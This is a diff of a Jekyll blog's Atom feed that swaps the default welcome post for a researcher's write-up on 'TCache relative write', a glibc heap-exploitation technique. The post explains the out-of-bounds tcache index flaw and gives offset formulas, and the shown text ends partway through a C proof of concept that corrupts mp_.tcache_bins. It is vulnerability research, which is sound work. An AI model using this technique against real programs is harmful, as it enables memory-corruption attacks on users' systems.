@@ -1,17 +1,430 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/blog/" rel="alternate" type="text/html" /><updated>2025-11-21T09:18:31-05:00</updated><id>http://localhost:4000/blog/feed.xml</id><title type="html">D4R30</title><subtitle>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.</subtitle><entry><title type="html">Welcome to Jekyll!</title><link href="http://localhost:4000/blog/jekyll/update/2025/11/21/welcome-to-jekyll.html" rel="alternate" type="text/html" title="Welcome to Jekyll!" /><published>2025-11-21T09:16:42-05:00</published><updated>2025-11-21T09:16:42-05:00</updated><id>http://localhost:4000/blog/jekyll/update/2025/11/21/welcome-to-jekyll</id><content type="html" xml:base="http://localhost:4000/blog/jekyll/update/2025/11/21/welcome-to-jekyll.html"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-11-26T06:13:58-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">D4R30</title><subtitle>Exploring low-level stuff,  Exploit Development &amp; Vulnerability Research </subtitle><entry><title type="html">TCache relative write</title><link href="http://localhost:4000/heap-exploit/2025/11/25/tcache-relative-write.html" rel="alternate" type="text/html" title="TCache relative write" /><published>2025-11-25T09:16:42-05:00</published><updated>2025-11-25T09:16:42-05:00</updated><id>http://localhost:4000/heap-exploit/2025/11/25/tcache-relative-write</id><content type="html" xml:base="http://localhost:4000/heap-exploit/2025/11/25/tcache-relative-write.html"><![CDATA[<ul id="markdown-toc">
+  <li><a href="#introduction" id="markdown-toc-introduction">Introduction</a>    <ul>
+      <li><a href="#prerequisites" id="markdown-toc-prerequisites">Prerequisites</a></li>
+    </ul>
+  </li>
+  <li><a href="#summary" id="markdown-toc-summary">Summary</a></li>
+  <li><a href="#brief-review-of-tcache_perthread_struct-management" id="markdown-toc-brief-review-of-tcache_perthread_struct-management">Brief review of <code class="language-plaintext highlighter-rouge">tcache_perthread_struct</code> management</a>    <ul>
+      <li><a href="#mp_-malloc_par" id="markdown-toc-mp_-malloc_par">mp_ (<code class="language-plaintext highlighter-rouge">malloc_par</code>)</a></li>
+    </ul>
+  </li>
+  <li><a href="#what-is-wrong-here" id="markdown-toc-what-is-wrong-here">What is wrong here?</a></li>
+  <li><a href="#tcache-relative-write---the-formulas" id="markdown-toc-tcache-relative-write---the-formulas">TCache relative write - The formulas</a></li>
+  <li><a href="#poc" id="markdown-toc-poc">PoC</a>    <ul>
+      <li><a href="#triggering-chunk-overlap" id="markdown-toc-triggering-chunk-overlap">Triggering chunk overlap</a></li>
+      <li><a href="#chunk-pointer-arbitrary-write" id="markdown-toc-chunk-pointer-arbitrary-write">Chunk pointer arbitrary write</a></li>
+      <li><a href="#tcache-metadata-poisoning" id="markdown-toc-tcache-metadata-poisoning">TCache metadata poisoning</a></li>
+      <li><a href="#is-combination-with-tcache-poisoningfastbin-corruption-possible" id="markdown-toc-is-combination-with-tcache-poisoningfastbin-corruption-possible">Is combination with tcache poisoning/fastbin corruption possible?</a></li>
+    </ul>
+  </li>
+  <li><a href="#patch-in-242-" id="markdown-toc-patch-in-242-">Patch in 2.42 ?</a></li>
+</ul>
 
-<p>Jekyll requires blog post files to be named according to the following format:</p>
+<h3 id="introduction">Introduction</h3>
 
-<p><code class="language-plaintext highlighter-rouge">YEAR-MONTH-DAY-title.MARKUP</code></p>
+<p><em>TCache relative write</em> is a TCache-based heap exploitation technique with the following objectives:</p>
+<ul>
+  <li>To write an arbitrary value on an arbitrary location on heap.</li>
+  <li>
+    <p>To write the pointer of an attacker-controlled chunk on an arbitrary location on heap.</p>
+  </li>
+  <li><strong>Cause:</strong> UAF/Overflow</li>
+  <li><strong>Applicable versions:</strong> <code class="language-plaintext highlighter-rouge">2.30</code> and higher versions</li>
+</ul>
 
-<p>Where <code class="language-plaintext highlighter-rouge">YEAR</code> is a four-digit number, <code class="language-plaintext highlighter-rouge">MONTH</code> and <code class="language-plaintext highlighter-rouge">DAY</code> are both two-digit numbers, and <code class="language-plaintext highlighter-rouge">MARKUP</code> is the file extension representing the format used in the file. After that, include the necessary front matter. Take a look at the source for this post to get an idea about how it works.</p>
+<p>By accomplishing the first objective, an attacker is capable of writing arbitrary values into heap metadata or user data and <code class="language-plaintext highlighter-rouge">tcache-&gt;entries</code>. This capability opens the doors to wide range of other heap-related and program-specific techniques, like chunk overlapping, tcache metadata poisoning, user data overwrite, and other forms of heap metadata corruption to trick the allocator.</p>
 
-<p>Jekyll also offers powerful support for code snippets:</p>
+<p>By accomplishing the second objective, the pointer to an attacker-controlled chunk can be written out-of-bounds and into an arbitrary place on heap, which can be used to hijack program-specific tables, or to corrupt chunks and perform techniques like <em>tcache poisoning</em> and <em>fastbin attack</em>. You can possibly achieve a heap-leak with tcache-relative-write, by writing a tcache chunk’s pointer into a part of heap that you can read from.</p>
 
-<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="k">def</span> <span class="nf">print_hi</span><span class="p">(</span><span class="nb">name</span><span class="p">)</span>
-  <span class="nb">puts</span> <span class="s2">"Hi, </span><span class="si">#{</span><span class="nb">name</span><span class="si">}</span><span class="s2">"</span>
-<span class="k">end</span>
-<span class="n">print_hi</span><span class="p">(</span><span class="s1">'Tom'</span><span class="p">)</span>
-<span class="c1">#=&gt; prints 'Hi, Tom' to STDOUT.</span></code></pre></figure>
+<h4 id="prerequisites">Prerequisites</h4>
+<ul>
+  <li>The ability to write a huge value on an arbitrary location</li>
+  <li>Libc leak</li>
+  <li>Being able to malloc/free with sizes higher than TCache maximum chunk size (0x408)</li>
+</ul>
 
-<p>Check out the <a href="https://jekyllrb.com/docs/home">Jekyll docs</a> for more info on how to get the most out of Jekyll. File all bugs/feature requests at <a href="https://github.com/jekyll/jekyll">Jekyll’s GitHub repo</a>. If you have questions, you can ask them on <a href="https://talk.jekyllrb.com/">Jekyll Talk</a>.</p>]]></content><author><name></name></author><category term="jekyll" /><category term="update" /><summary type="html"><![CDATA[You’ll find this post in your _posts directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run jekyll serve, which launches a web server and auto-regenerates your site when a file is updated.]]></summary></entry></feed>
+<p>You can satisfy the first prerequisite by techniques like largebin attack, house of mind (fastbin), fastbin reverse into tcache, or any program-specific form of arbitrary address writing. You don’t need full arbitrary value control on the writing address; writing a value higher than 64 is sufficient.</p>
+
+<p>In the next blog post, I will demonstrate a complete exploit chain using this technique as its base, called <em>House of Liz</em>.</p>
+
+<h3 id="summary">Summary</h3>
+<p>The core concept of “TCache relative writing” is around the fact that when the allocator is recording a tcache chunk in <code class="language-plaintext highlighter-rouge">tcache_perthread_struct</code>, TCache mechanism does not enforce enough check and restraint on the computed tcachebin indice (<code class="language-plaintext highlighter-rouge">tc_idx</code>), thus WHERE the tcachebin count and head pointer can be written are not restricted by the allocator by any means. The allocator treats extended bin indices as valid in both <code class="language-plaintext highlighter-rouge">tcache_put</code> and <code class="language-plaintext highlighter-rouge">tcache_get</code> scenarios. If we’re somehow able to write a huge value on one of the fields of <code class="language-plaintext highlighter-rouge">mp_</code> (<code class="language-plaintext highlighter-rouge">tcache_bins</code> from <a href="https://elixir.bootlin.com/glibc/glibc-2.41/source/malloc/malloc.c#L1858"><code class="language-plaintext highlighter-rouge">malloc_par</code></a>), by requesting a chunk size higher than TCache range, we can control the place that a <strong>tcachebin pointer</strong> and <strong>counter</strong> is going to be written. Considering the fact that a <code class="language-plaintext highlighter-rouge">tcache_perthread_struct</code> is normally placed on heap, one can perform a <em>TCache relative write</em> on an arbitrary point located after the tcache metadata chunk (Even on <code class="language-plaintext highlighter-rouge">tcache-&gt;entries</code> list to poison tcache metadata). By writing the new freed tcache chunk’s pointer, we can combine this technique with other techniques like tcache poisoning or fastbin corruption and to trigger a heap leak. By writing the new counter, we can poison <code class="language-plaintext highlighter-rouge">tcache-&gt;entries</code>, write arbitrary value into an arbitrary location of heap, with the right amount of mallocs and frees. With all these combined, one is able to create impactful chains of exploits, using this technique as their foundation.</p>
+
+<h3 id="brief-review-of-tcache_perthread_struct-management">Brief review of <code class="language-plaintext highlighter-rouge">tcache_perthread_struct</code> management</h3>
+<p>For each thread that has invoked <code class="language-plaintext highlighter-rouge">__libc_malloc</code> there exists a heap-allocated structure which is responsible for tracking two main variables for each tcache bin: The counter (Current number of chunks in the tcachebin) and the tcache bin head pointer. Here’s its <a href="https://elixir.bootlin.com/glibc/glibc-2.41/source/malloc/malloc.c#L3120">structure</a>:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">tcache_perthread_struct</span>
+<span class="p">{</span>
+  <span class="kt">uint16_t</span> <span class="n">num_slots</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>      <span class="c1">// The counters list</span>
+  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">entries</span><span class="p">[</span><span class="n">TCACHE_MAX_BINS</span><span class="p">];</span>   <span class="c1">// tcachebins pointers</span>
+<span class="p">}</span> <span class="n">tcache_perthread_struct</span><span class="p">;</span></code></pre></figure>
+
+<p>Assuming that <code class="language-plaintext highlighter-rouge">TCACHE_MAX_BINS</code> equals to 64, we have 128 bytes reserved for <code class="language-plaintext highlighter-rouge">num_slots</code> and 512 bytes for <code class="language-plaintext highlighter-rouge">entries</code>, making up a structure of 0x280 in size. So if this structure gets allocated on the heap, this is what it would look like if you used the <code class="language-plaintext highlighter-rouge">heap</code> command on pwndbg:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x555555559000
+Size: 0x290 <span class="o">(</span>with flag bits: 0x291<span class="o">)</span></code></pre></figure>
+
+<p>Because tcache bins are managed in a LIFO manner, the head of a tcache bin always points to the most recently inserted chunk. So assuming we already have two chunks A and B of size 0x20, inserted respectively into tcache[0], and another 0x20 chunk (C) is inserted, this is a simplified representation of how it would look like:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// Before: </span>
+<span class="n">num_slots</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span>
+
+    <span class="n">tcache_entries</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+       <span class="o">|</span>
+       <span class="n">V</span>
+       <span class="n">B</span> <span class="o">-----</span><span class="p">(</span><span class="n">B</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">A</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">)</span><span class="o">---------&gt;</span> <span class="n">A</span> <span class="p">(</span><span class="n">A</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">)</span>
+
+<span class="c1">// After:</span>
+<span class="n">num_slots</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span>
+
+    <span class="n">tcache_entries</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+       <span class="o">|</span>
+       <span class="n">V</span>
+       <span class="n">C</span> <span class="o">-----</span><span class="p">(</span><span class="n">C</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">B</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">)</span><span class="o">--------&gt;</span> <span class="n">B</span> <span class="o">-----</span><span class="p">(</span><span class="n">B</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">A</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">)</span><span class="o">---------&gt;</span> <span class="n">A</span> <span class="p">(</span><span class="n">A</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">)</span></code></pre></figure>
+
+<p>Here’s the code for <code class="language-plaintext highlighter-rouge">tcache_put</code> (<code class="language-plaintext highlighter-rouge">tcache_put_n</code> in GLIBC <code class="language-plaintext highlighter-rouge">&gt;=2.42</code>):</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/* Caller must ensure that we know tc_idx is valid and there's room
+   for more chunks.  */</span>
+<span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span>
+<span class="nf">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
+
+  <span class="p">...</span>
+
+  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
+  <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>As we can see in the comment, it is caller’s responsibility to ensure <code class="language-plaintext highlighter-rouge">tc_idx</code>’s validity. There are multiple scenarios that can lead to <code class="language-plaintext highlighter-rouge">tcache_put</code> call, but in our case we’re just interested in how <a href="https://elixir.bootlin.com/glibc/glibc-2.41/source/malloc/malloc.c#L3249"><code class="language-plaintext highlighter-rouge">tcache_free</code></a> calls it. So lets see how the caller actually handles <code class="language-plaintext highlighter-rouge">tc_idx</code>:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kr">inline</span> <span class="n">bool</span>
+<span class="nf">tcache_free</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">p</span><span class="p">,</span> <span class="n">INTERNAL_SIZE_T</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">bool</span> <span class="n">done</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="n">csize2tidx</span> <span class="p">(</span><span class="n">size</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="cm">/* Check to see if it's already in the tcache.  */</span>
+      <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
+
+      <span class="cm">/* This test succeeds on double free.  However, we don't 100%
+	 trust it (it also matches random payload data at a 1 in
+	 2^&lt;size_t&gt; chance), so verify it's not an unlikely
+	 coincidence before aborting.  */</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">==</span> <span class="n">tcache_key</span><span class="p">))</span>
+	<span class="n">tcache_double_free_verify</span> <span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span><span class="p">)</span>
+	<span class="p">{</span>
+	  <span class="n">tcache_put</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
+	  <span class="n">done</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+	<span class="p">}</span>
+    <span class="p">}</span>
+  <span class="k">return</span> <span class="n">done</span><span class="p">;</span>
+<span class="p">}</span> </code></pre></figure>
+
+<p>To calculate the corresponding tcache index (<code class="language-plaintext highlighter-rouge">tc_idx</code>) for a new freeing chunk, <code class="language-plaintext highlighter-rouge">tcache_free</code> uses the macro <a href="https://elixir.bootlin.com/glibc/glibc-2.41/source/malloc/malloc.c#L301"><code class="language-plaintext highlighter-rouge">csize2tidx</code></a>, which has the following defenition:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp"># define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></code></pre></figure>
+
+<p>Basically, <code class="language-plaintext highlighter-rouge">csize2tidx</code> computes the appropriate tcache index for a chunk <strong>based on the requested size</strong>. This index is then used by <code class="language-plaintext highlighter-rouge">tcache_put</code> to update <code class="language-plaintext highlighter-rouge">tcache_perthread_struct.entries</code> and <code class="language-plaintext highlighter-rouge">tcache_perthread_struct.num_slots</code>. In <code class="language-plaintext highlighter-rouge">tcache_free</code>, <strong>the only check on <code class="language-plaintext highlighter-rouge">tc_idx</code> is its comparison with <code class="language-plaintext highlighter-rouge">mp_.tcache_bins</code>.</strong></p>
+
+<h4 id="mp_-malloc_par">mp_ (<code class="language-plaintext highlighter-rouge">malloc_par</code>)</h4>
+<p>The <code class="language-plaintext highlighter-rouge">mp_</code> variable (based on <code class="language-plaintext highlighter-rouge">malloc_par</code>) is a structure that holds global configuration parameters that control the behavior of glibc malloc. There are many fields that affect memory allocation, mmap usage and trimming, but what we’re particularly interested in are fields related to tcache:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#if USE_TCACHE
+</span>  <span class="cm">/* Maximum number of buckets to use.  */</span>
+  <span class="kt">size_t</span> <span class="n">tcache_bins</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">tcache_max_bytes</span><span class="p">;</span>
+  <span class="cm">/* Maximum number of chunks in each bucket.  */</span>
+  <span class="kt">size_t</span> <span class="n">tcache_count</span><span class="p">;</span>
+  <span class="cm">/* Maximum number of chunks to remove from the unsorted list, which
+     aren't used to prefill the cache.  */</span>
+  <span class="kt">size_t</span> <span class="n">tcache_unsorted_limit</span><span class="p">;</span>
+<span class="cp">#endif</span></code></pre></figure>
+
+<p>For TCache relative write, what we’re interested in are the <code class="language-plaintext highlighter-rouge">tcache_bins</code> and <code class="language-plaintext highlighter-rouge">tcache_count</code> fields. <code class="language-plaintext highlighter-rouge">tcache_bins</code> stores the amount of available tcachebins; thus the maximum tcache indice equals <code class="language-plaintext highlighter-rouge">mp_.tcache_bins-1</code>. <code class="language-plaintext highlighter-rouge">tcache_count</code> holds the maximum amount of chunks that a tcachebin can store. As I mentioned above, <code class="language-plaintext highlighter-rouge">tc_idx</code> is simply compared with the <code class="language-plaintext highlighter-rouge">tcache_bins</code> field from this structure, therefore, overwriting <code class="language-plaintext highlighter-rouge">tcache_bins</code> with a large value enables us to pass large tcache indices.</p>
+
+<h3 id="what-is-wrong-here">What is wrong here?</h3>
+<p>The main problem here is that although <code class="language-plaintext highlighter-rouge">tcache_perthread_struct</code>’s fields are allocated and managed statically (since <code class="language-plaintext highlighter-rouge">TCACHE_MAX_BINS</code> is a constant), GLIBC’s validation of <code class="language-plaintext highlighter-rouge">tc_idx</code> fails to account for this. <code class="language-plaintext highlighter-rouge">mp_.tcache_bins</code> alone as a dynamic should not be treated as a reliable indicator of whether a <code class="language-plaintext highlighter-rouge">tc_idx</code> is valid. If one is able to change <code class="language-plaintext highlighter-rouge">mp_.tcache_bins</code> – for example by overwriting it with a value larger than 64 –, he can craft a large <code class="language-plaintext highlighter-rouge">tc_idx</code>, pass the <code class="language-plaintext highlighter-rouge">tc_idx &lt; mp_.tcache_bins</code> check, and trigger an out-of-bounds relative write into heap.</p>
+<ul>
+  <li>Note: In my opinion, this should be considered a design flaw. Although using a controllable parameter (<code class="language-plaintext highlighter-rouge">mp_.tcache_bins</code>) to make this check might look eligible for portability reasons, I believe this is a wrong approach of doing so. The developers should consider a <strong>dynamic</strong> and more portable solution for managing the tcache structure, so that if parameters are changed by any means, system’s behavior remains expected.</li>
+</ul>
+
+<p>So this was the easy part. The main question now is how we can actually control <strong>WHERE</strong> and <strong>WHAT</strong> value <code class="language-plaintext highlighter-rouge">tcache_put</code> is going to write? The relative write technique to write an attacker-controlled chunk ptr out-of-bounds is not something new, and has been used on fastbins in technique like <em>House of Husk</em>. What makes TCache relative write interesting is not just the fact that the mentioned goal can be achieved on TCache, but that it also gives an attacker the ability to choose WHAT to write (due to the associated counter variable). Although the only thing done with the counter variable is a single increment, an attacker can still achieve arbitrary value write, with the right amount of mallocs and frees.</p>
+
+<p>The rest of this post is focused on how we can use this poor indexing for our advantage. To create useful exploit chains, we have to be precise. So lets first do some basic math.</p>
+
+<h3 id="tcache-relative-write---the-formulas">TCache relative write - The formulas</h3>
+<p>The idea is to craft a precise <code class="language-plaintext highlighter-rouge">tc_idx</code> such that, when it is used by <code class="language-plaintext highlighter-rouge">tcache_put</code>, the resulting write of tcachebin pointer and its counter occurs beyond the bounds of <code class="language-plaintext highlighter-rouge">tcache_perthread_struct</code> and into our target location. This is done by requesting a chunk with the right amount of size and then freeing it. To compute the right size, we have to consider <code class="language-plaintext highlighter-rouge">csize2tidx</code> and the pointer arithmetic within <code class="language-plaintext highlighter-rouge">tcache_put</code> when it comes to indexing. The only check that can stop us from out-of-bounds writing is the <code class="language-plaintext highlighter-rouge">tc_idx &lt; mp_.tcache_bins</code> check, which can get bypassed by writing a large value on <code class="language-plaintext highlighter-rouge">mp_.tcache_bins</code></p>
+
+<p>If we let <code class="language-plaintext highlighter-rouge">nb</code> be the internal form of the freeing chunk size, <code class="language-plaintext highlighter-rouge">MALLOC_ALIGNMENT=0x10</code>, and <code class="language-plaintext highlighter-rouge">MINSIZE=0x20</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tc_index = (nb - 0x20 + 0x10 -1) / 0x10 = (nb - 0x11) / 0x10
+</code></pre></div></div>
+<p>Because <code class="language-plaintext highlighter-rouge">tc_index</code> is an integer:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tc_index = (nb-16)/16 - 1
+</code></pre></div></div>
+<p>So if <code class="language-plaintext highlighter-rouge">nb = 0x20</code> (least chunk size), then <code class="language-plaintext highlighter-rouge">tc_index = 0</code>, if <code class="language-plaintext highlighter-rouge">nb = 0x30</code>, then <code class="language-plaintext highlighter-rouge">tc_index = 1</code>, and so on.</p>
+
+<p>With some knowledge of C pointer arithmetic, we can predict the location of the tcachebin pointer &amp; counter write, just by having <code class="language-plaintext highlighter-rouge">nb</code> on our hands:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Here `tcache` is just symbol for a pointer to the heap-allocated `tcache_perthread_struct` 
+unsigned long *ptr_write_loc = (void*)(&amp;tcache-&gt;entries) + 8*tc_index = (void*)(&amp;tcache-&gt;entries) + (nb-16)/2 - 8
+unsigned long *counter_write_loc = (void*)(&amp;tcache-&gt;counts) + 2*tc_index = (void*)(&amp;tcache-&gt;counts) + (nb-16)/8 - 2
+</code></pre></div></div>
+<p>In other words:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">Our_preferred_ptr_location = tcache_entries location + (nb-16)/2 - 8</code></li>
+  <li><code class="language-plaintext highlighter-rouge">Our_preferred_counter_location = tcache_counts location + (nb-16)/8 - 2</code></li>
+</ul>
+
+<p>You might think that to compute <code class="language-plaintext highlighter-rouge">nb</code>, you need two pointer address, thus a heap leak. That is not true. You just have to compute the difference (delta) between fields of <code class="language-plaintext highlighter-rouge">tcache_perthread_struct</code> and your target location, which does not require a heap leak and can be easily done by a debugger.</p>
+
+<p>For example, if the tcache structure is allocated at <code class="language-plaintext highlighter-rouge">0x555555559000</code>, and you want to overwrite a half-word (<code class="language-plaintext highlighter-rouge">++counts[tc_index]</code>) at <code class="language-plaintext highlighter-rouge">0x5555555596b8</code>, delta would be:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>delta = 0x5555555596b8 - (&amp;tcache-&gt;counts) = 0x5555555596b8 - 0x555555559010 = 0x6a8
+</code></pre></div></div>
+<p>Even if ASLR is on, the delta would always be <code class="language-plaintext highlighter-rouge">0x6a8</code>. So no heap-leak is required.</p>
+
+<p>Now to calculate nb for a count write:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>delta = 0x6a8 = (nb-16)/8 - 2 --&gt; nb = (0x6aa*8) + 16 = 0x3560 
+</code></pre></div></div>
+<p>So if we request a chunk of size <code class="language-plaintext highlighter-rouge">0x3550</code> and then free it, <code class="language-plaintext highlighter-rouge">counts[tc_index]</code> would be equal to <code class="language-plaintext highlighter-rouge">*0x5555555596b8</code>, thus by the count increment we actually increment whatever that is stored in <code class="language-plaintext highlighter-rouge">0x5555555596b8</code>.
+Now assuming you want to write the freed chunk pointer’s address at <code class="language-plaintext highlighter-rouge">0x5555555596c0</code>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>delta = 0x5555555596c0 - (&amp;tcache-&gt;entries) = 0x5555555596c0 - 0x555555559090 = 0x630
+(nb-16)/2 - 8 = 0x630 --&gt; nb = 0xc80
+</code></pre></div></div>
+
+<h3 id="poc">PoC</h3>
+<p>Here I discuss the PoC by implementing three ways of taking advantage, by using the discussed primitives:</p>
+<ul>
+  <li><strong>Chunk overlapping attack</strong>: To illustarte how an attacker can use the counter arbitrary write primitive to trigger chunk overlapping.</li>
+  <li><strong>Chunk pointer arbitrary write</strong>: To illustrate how an attacker can relative write the freed chunk’s pointer into an arbitrary location of heap.</li>
+  <li><strong>TCache metadata poisoning</strong>: To illustrate how an attacker can trick the allocator into returning a pointer to an arbitrary location, by multiple increments on the elements of <code class="language-plaintext highlighter-rouge">tcache-&gt;entries</code>.</li>
+</ul>
+
+<h4 id="triggering-chunk-overlap">Triggering chunk overlap</h4>
+<p>Here’s a PoC of how the <em>arbitrary counter-writing</em> capability can be used for a overlapping chunk attack:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// This has been tested on GLIBC 2.41</span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;malloc.h&gt;</span><span class="cp">
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x410</span><span class="p">);</span>	<span class="c1">// The chunk that we can overflow or have a UAF on</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">p2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>	<span class="c1">// The target chunk used to demonstrate chunk overlap</span>
+    <span class="kt">size_t</span> <span class="n">p2_orig_size</span> <span class="o">=</span> <span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
+    
+    <span class="n">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>
+
+    <span class="cm">/* VULNERABILITY */</span>
+    
+    <span class="c1">// --- Step 1: Write a huge value into mp_.tcache_bins ---</span>
+    <span class="c1">// You should have the ability to write a huge value on an arbitrary location; this doesn't necessarily</span>
+    <span class="c1">// mean a full arbitrary write. Writing any value larger than 64 would suffice.</span>
+    <span class="c1">// This could be done in a program-specific way, or by a UAF/Overflow in target program. By a UAF/Overflow,</span>
+    <span class="c1">// you can use techniques like largebin attack, fastbin_reverse_into_tcache and house of mind (fastbins).</span>
+
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">mp_tcache_bins</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">p1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x938</span><span class="p">;</span>   <span class="c1">// Relative computation of &amp;mp_.tcache_bins</span>
+    <span class="o">*</span><span class="n">mp_tcache_bins</span> <span class="o">=</span> <span class="mh">0x7fffffffffff</span><span class="p">;</span>	<span class="c1">// Write a large value into mp_.tcache_bins</span>
+
+    <span class="cm">/* END VULNERABILITY */</span>
+
